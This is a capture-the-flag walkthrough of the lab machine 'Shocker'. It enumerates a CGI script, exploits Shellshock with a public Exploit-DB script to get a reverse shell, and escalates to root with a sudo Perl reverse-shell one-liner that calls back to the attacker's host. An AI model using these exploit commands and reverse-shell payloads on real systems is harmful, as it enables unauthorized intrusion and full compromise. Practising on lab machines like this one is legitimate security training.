I start with an nmap scan : 
└─# nmap -sC -sV -A 10.10.10.56
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Only two ports open, so I proceed to run a full nmap port scan:
└─# nmap -p- --min-rate 10000 10.10.10.56
Again only two ports above are open.

I now proceed to the website but I do not see many hints. So I start off a gobuster:
└─# gobuster dir -u http://10.10.10.56 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php,html
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/cgi-bin/             (Status: 403) [Size: 294]
/index.html           (Status: 200) [Size: 137]

The cgi-bin is the only one that stands out and with the idea that this box is called shocker. I decide to dig deeper:
└─# wfuzz -u http://10.10.10.56/cgi-bin/FUZZ.sh -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                              
=====================================================================

000000024:   403        11 L     32 W       306 Ch      ".htaccess"                                                                          
000000023:   403        11 L     32 W       301 Ch      ".hta"                                                                               
000000025:   403        11 L     32 W       306 Ch      ".htpasswd"                                                                          
000004290:   200        7 L      17 W       118 Ch      "user"

I search around for a script which would assist me test for shellshock vulnerability. Found a promising one on : https://www.exploit-db.com/exploits/34900
└─# python exploit.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.14 lport=1234 pages=/cgi-bin/user.sh
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> pwd
/usr/lib/cgi-bin

10.10.10.56> whoami
shelly

10.10.10.56> ls
user.sh

10.10.10.56> which python
10.10.10.56> cd /home/shelly
10.10.10.56> ls
user.txt

10.10.10.56> cat user.txt
e7454fa15d81995e7714c041ca35cbb3

==========================Priv Escalation=======================
10.10.10.56> sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
 ----------------------------------------
 sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.14";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ---------------------------
# whoami
root
# pwd
/tmp
# cd /root
# ls
root.txt
# cat root.txt
3898b0369b82d1e0e05d796173680769
